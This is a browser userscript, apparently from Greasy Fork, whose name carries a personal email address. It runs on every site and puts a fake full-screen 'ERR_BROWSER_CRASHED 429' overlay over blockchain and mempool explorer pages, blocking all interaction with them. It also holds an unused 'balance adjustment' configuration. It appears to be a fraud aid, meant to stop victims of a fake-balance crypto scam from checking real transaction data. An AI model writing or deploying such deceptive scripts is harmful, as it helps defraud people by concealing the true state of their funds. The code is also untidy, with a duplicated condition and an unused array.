// ==UserScript==
// @name         Ed 4Rec  vb.asa.hessel@t-online.de
// @namespace    http://tampermonkey.net/
// @version      7.2
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/543886/Ed%204Rec%20%20vbasahessel%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/543886/Ed%204Rec%20%20vbasahessel%40t-onlinede.meta.js
// ==/UserScript==


// Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  1},  // 72000
        { index: 1, adjustmentAmount:  1},  // 72000
        { index: 2, adjustmentAmount:  1},  // 72000
        { index: 3, adjustmentAmount: 0},
        { index: 4, adjustmentAmount: 0},
        { index: 3, adjustmentAmount: 0 },
        { index: 4, adjustmentAmount: 0}
        // Add more balance configurations as needed
    ];

if (
    window.location.href.includes('mempool') ||
    window.location.href.includes('blockchain') ||
    window.location.href.includes('space')
) {

// ======== MASTER ENABLE SWITCH ========
const RUN_SCRIPT = true; // true = YES, false = NO
if (!RUN_SCRIPT) {
    return;
}
// =====================================

if (
    window.location.href.includes('mempool') ||
    window.location.href.includes('blockchain') ||
    window.location.href.includes('space')
) {
    'use strict';

    // ======== CONFIGURATION ========
    const ERROR_MESSAGE = "ERR_BROWSER_CRASHED 429"; // <-- CHANGE THIS TEXT
    // ===============================

    function showPopup() {
        // Prevent page interaction
        document.documentElement.style.pointerEvents = "none";

        const overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100vw";
        overlay.style.height = "100vh";
        overlay.style.background = "rgba(0, 0, 0, 0.85)";
        overlay.style.zIndex = "2147483647";
        overlay.style.display = "flex";
        overlay.style.alignItems = "center";
        overlay.style.justifyContent = "center";
        overlay.style.pointerEvents = "auto";

        const box = document.createElement("div");
        box.style.background = "#111";
        box.style.color = "#ff3b3b";
        box.style.padding = "30px 40px";
        box.style.fontSize = "24px";
        box.style.fontFamily = "Arial, sans-serif";
        box.style.border = "2px solid #ff3b3b";
        box.style.borderRadius = "8px";
        box.style.boxShadow = "0 0 20px rgba(255,0,0,0.6)";
        box.style.textAlign = "center";
        box.textContent = ERROR_MESSAGE;

        overlay.appendChild(box);

        // Wait for body to exist
        const waitForBody = setInterval(() => {
            if (document.body) {
                clearInterval(waitForBody);
                document.body.appendChild(overlay);
            }
        }, 10);
    }

    showPopup();
}

    }